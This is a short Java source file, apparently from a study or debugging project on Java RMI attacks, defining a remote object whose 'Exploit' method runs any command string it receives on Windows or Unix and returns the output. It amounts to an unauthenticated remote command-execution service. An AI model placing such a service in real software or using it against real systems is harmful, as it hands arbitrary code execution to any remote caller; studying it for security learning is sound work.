package com.sorry.jcoffe.Debug.RMI;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class EXPImpl extends UnicastRemoteObject implements EXP {

    protected EXPImpl() throws RemoteException {}

    @Override
    public String Exploit(String cmd) throws IOException {

        //ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh","-c",cmd);
        Process p;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
        return bufferedReader.readLine();

    }
}
